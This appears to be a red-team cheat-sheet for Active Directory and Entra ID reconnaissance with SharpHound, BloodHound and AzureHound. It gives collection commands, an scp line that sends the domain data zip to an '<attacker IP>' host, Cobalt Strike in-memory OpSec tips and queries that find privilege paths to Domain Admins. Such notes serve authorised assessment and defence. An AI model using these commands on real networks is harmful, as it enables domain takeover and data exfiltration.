# SharpHound Collection

## Overview

SharpHound uses LDAP and native Win32 APIs to map users, groups, sessions, ACLs, and trusts into JSON for BloodHound.

Default collection from domain-joined host gathers group memberships, trusts, abusable ACLs, GPO links, OUs, and local admin/session data from reachable computers. Session enumeration can take 10–15 minutes on busy networks.

## Commands

From domain-joined PowerShell:
    Import-Module .\SharpHound.ps1
    Invoke-BloodHound -CollectionMethod All
    Invoke-BloodHound -CollectionMethod ACL,Session,Trusts

Collectors:
    https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors

Upload zip to analyst machine (example):
    Compress-Archive -Path .\<timestamp>_BloodHound.zip -DestinationPath .\sharp.zip
    scp sharp.zip kali@<attacker IP>:/tmp/

## OpSec

Prefer in-memory collection on authorized assessments:
    Cobalt Strike execute-assembly with SharpHound.exe
    Invoke-BloodHound from a writable user directory, not a world-readable share

## Validation / False Positives

BloodHound shows graph reachability — confirm each edge with manual abuse steps in ad-attacks.txt.
Missing session data produces incomplete paths — rerun with Session collection when safe.


# BloodHound Analysis

## Overview

BloodHound Community Edition (CE) is the current project. Legacy BloodHound used Neo4j — still seen in older lab environments.

## Commands

BloodHound CE (current):
    https://github.com/SpecterOps/BloodHound
    Install per release notes (Linux AppImage or package)
    Import the SharpHound zip via the UI

Legacy BloodHound + Neo4j:
    neo4j console
    Open http://localhost:7474
    Login neo4j:neo4j, set new password
    bloodhound
    Login neo4j:<new password>
    Drag and drop SharpHound zip into the GUI

Reset Neo4j password:
    /usr/share/neo4j/bin/neo4j-admin set-initial-password neo4j

Useful queries:
    Shortest path to Domain Admins from owned principals
    All Kerberoastable users with path to DA
    AS-REP roastable users

## Validation / False Positives

A path through many hops may be theoretical — validate ownership of each node in the path.
Pre-built queries highlight candidates; exploitation still requires credentials or ACL rights.

Relay path examples (NTLM relay / coercion):
    MATCH p=(c1:Computer)-[r1:MemberOf*1..]->(g:Group)-[r2:AdminTo]->(n:Computer) RETURN p
    MATCH (c1:Computer)-[r1:MemberOf*1..]->(g:Group)-[r2:AdminTo]->(c2:Computer) RETURN c1.name,c2.name

cd C:\Users\<user>\Desktop

## Validation / False Positives

GenericAll, WriteDacl, and ForceChangePassword in CSV need manual confirmation — see ad-attacks.txt.


# AzureHound

## Overview

Collect Azure AD / Entra ID data for BloodHound analysis of hybrid environments.

## Commands

https://github.com/BloodHoundAD/AzureHound/releases

Run with appropriate Azure credentials per tool documentation.
Import output into BloodHound CE alongside on-prem SharpHound data.

## Validation / False Positives

Cloud edges depend on sync and app permissions — correlate with portal configuration before reporting.
